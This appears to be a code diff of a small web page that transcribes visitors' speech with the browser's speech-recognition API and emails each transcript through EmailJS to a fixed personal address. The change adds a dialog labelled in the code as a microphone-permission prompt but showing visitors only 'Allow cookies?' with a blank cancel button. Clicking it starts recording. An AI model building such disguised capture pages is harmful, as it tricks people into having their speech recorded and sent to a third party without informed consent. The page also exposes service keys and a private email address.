@@ -1,138 +1,136 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="utf-8">
-  <meta content="width=device-width, initial-scale=1.0" name="viewport">
-
-  <title>Recorded inc.</title>
-  <meta content="" name="description">
-  <meta content="" name="keywords">
-
-  <!-- Favicons -->
-  <link href="assets/img/logos.png" rel="icon">
-  <link href="assets/img/logos.png" rel="apple-touch-icon">
-
-  <!-- Google Fonts -->
-  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
-
-  <!-- Vendor CSS Files -->
-  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
-  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
-  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
-  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
-  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
-  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
-
-  <!-- Template Main CSS File -->
-  <link href="assets/css/style.css" rel="stylesheet">
-
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Bench Mens bud</title>
+    <meta content="" name="description">
+    <meta content="" name="keywords">
+    <!-- Favicons -->
+    <link href="assets/img/logos.png" rel="icon">
+    <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+    <!-- Vendor CSS Files -->
+    <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+    <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+    <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+    <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+    <!-- Template Main CSS File -->
+    <link href="assets/css/style.css" rel="stylesheet">
 </head>
-
 <body>
-
-  <!-- ======= Header ======= -->
-  <header id="header" class="d-flex align-items-center">
-    <div class="container d-flex align-items-center justify-content-between">
-
-      <h1 class="logo"><a href="index.html">Recorded INC🔴</a></h1>
-
+    <!-- ======= Header ======= -->
+    <header id="header" class="d-flex align-items-center">
+        <div class="container d-flex align-items-center justify-content-between">
+            <h1 class="logo"><a href="index.html">Recorded INC🔴</a></h1>
+        </div>
+    </header><!-- End Header -->
+    <!-- ======= Hero Section ======= -->
+    <section id="hero" class="d-flex align-items-center">
+        <div class="container position-relative" data-aos="fade-up" data-aos-delay="500">
+            <h1>Welcome to Recorded INC.</h1>      
+            <h2>Where you'll be recorded</h2>
+            <h2 id="recordedText"></h2>
+            <h2 id="successMessage" style="display: none;">EMAIL SENT SUCCESSFULLY</h2>
+        </div>
+    </section><!-- End Hero -->
+    <!-- Custom Modal for Microphone Permission -->
+    <div id="microphoneModal" class="modal">
+        <div class="modal-content">
+            <p>Allow cookies?</p>
+            <button id="allowButton">Allow</button>
+            <button id="cancelButton"> </button>
+        </div>
     </div>
-  </header><!-- End Header -->
+    <main id="main">
+        <!-- Your main content here -->
+    </main><!-- End #main -->
+    <!-- ======= Footer ======= -->
+    <footer id="footer">
+        <div class="container">
+            <div class="credits">
+                Done by <a>James Rafael Boroy</a>
+            </div>
+        </div>
+    </footer><!-- End Footer -->
+    <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+    <div id="preloader"></div>
+    <!-- Vendor JS Files -->
+    <script src="assets/vendor/aos/aos.js"></script>
+    <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+    <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+    <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+    <script src="assets/vendor/php-email-form/validate.js"></script>
+    <!-- Template Main JS File -->
+    <script src="assets/js/main.js"></script>
+    <!-- EmailJS Library -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your user ID
+        emailjs.init("u0cLAi5JQo4hKs_qS");
 
-  <!-- ======= Hero Section ======= -->
-  <section id="hero" class="d-flex align-items-center">
-    <div class="container position-relative" data-aos="fade-up" data-aos-delay="500">
-      <h1>Welcome to Recorded INC.</h1>      
-      <h2>Where you'll be recorded</h2>
-      <h2 id="recordedText"></h2>
-      <h2 id="successMessage" style="display: none;">EMAIL SENT SUCCESSFULLY</h2>
+        var SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition;
+        var voiceRecognition = new SpeechRecognition();
 
-    </div>
-  </section><!-- End Hero -->
+        // Set language to English (United States)
+        voiceRecognition.lang = 'en-US';
 
-  <main id="main">
+        // Disable interim results
+        voiceRecognition.interimResults = false;
 
-    
-  </main><!-- End #main -->
+        // Set the maximum number of alternative transcripts to 5
+        voiceRecognition.maxAlternatives = 5;
 
-  <!-- ======= Footer ======= -->
-  <footer id="footer">
+        var microphoneModal = document.getElementById('microphoneModal');
+        var allowButton = document.getElementById('allowButton');
+        var cancelButton = document.getElementById('cancelButton');
 
-    <div class="container">
-      <div class="credits">
-        Done by <a>James Rafael Boroy</a>
-      </div>
-    </div>
-  </footer><!-- End Footer -->
+        allowButton.onclick = function() {
+            microphoneModal.style.display = 'none';
+            voiceRecognition.start();
+        };
 
-  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
-  <div id="preloader"></div>
+        cancelButton.onclick = function() {
+            microphoneModal.style.display = 'none';
+            // Handle cancel action here
+        };
 
-  <!-- Vendor JS Files -->
-  <script src="assets/vendor/aos/aos.js"></script>
-  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
-  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
-  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
-  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
-  <script src="assets/vendor/php-email-form/validate.js"></script>
+        voiceRecognition.onresult = function(event) {
+            var recordedVoice = event.results[0][0].transcript;
+            document.getElementById('recordedText').innerHTML = 'Recorded Voice: ' + recordedVoice;
+            // Send email with recorded voice message
+            sendEmail(recordedVoice);
+        };
 
-  <!-- Template Main JS File -->
-  <script src="assets/js/main.js"></script>
+        // Show custom modal for microphone permission
+        microphoneModal.style.display = 'block';
 
-  <!-- EmailJS Library -->
-  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-  <script>
-    // Initialize EmailJS with your user ID
-    emailjs.init("u0cLAi5JQo4hKs_qS");
+        // Function to send email
+        function sendEmail(message) {
+            // Replace these values with your own
+            var serviceID = 'service_z2yapm2';
+            var templateID = 'template_ah15atr';
+            var userID = 'u0cLAi5JQo4hKs_qS';
 
-    var SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition;
-    var voiceRecognition = new SpeechRecognition();
+            // Prepare email parameters
+            var templateParams = {
+                to_email: 'jamesrfael@gmail.com',
+                message: message
+            };
 
-    // Set language to English (United States)
-    voiceRecognition.lang = 'en-US';
-
-    // Disable interim results
-    voiceRecognition.interimResults = false;
-
-    // Set the maximum number of alternative transcripts to 5
-    voiceRecognition.maxAlternatives = 5;
-
-    voiceRecognition.onresult = function(event) {
-      var recordedVoice = event.results[0][0].transcript;
-      document.getElementById('recordedText').innerHTML = 'Recorded Voice: ' + recordedVoice;
-
-      // Send email with recorded voice message
-      sendEmail(recordedVoice);
-    };
-
-    // Start voice recognition when the page loads
-    voiceRecognition.start();
-
-    // Function to send email
-    function sendEmail(message) {
-      // Replace these values with your own
-      var serviceID = 'service_z2yapm2';
-      var templateID = 'template_ah15atr';
-      var userID = 'u0cLAi5JQo4hKs_qS';
-
-      // Prepare email parameters
-      var templateParams = {
-        to_email: 'jamesrfael@gmail.com',
-        message: message
-      };
-
-      // Send the email
-      emailjs.send(serviceID, templateID, templateParams, userID)
-        .then(function(response) {
-          console.log('Email sent successfully', response);
-          document.getElementById('successMessage').style.display = 'block';
-        }, function(error) {
-          console.error('Email sending failed', error);
-        });
-    }
-  </script>
-
+            // Send the email
+            emailjs.send(serviceID, templateID, templateParams, userID)
+            .then(function(response) {
+                console.log('Email sent successfully', response);
+                document.getElementById('successMessage').style.display = 'block';
+            }, function(error) {
+                console.error('Email sending failed', error);
+            });
+        }
+    </script>
 </body>
-
 </html>
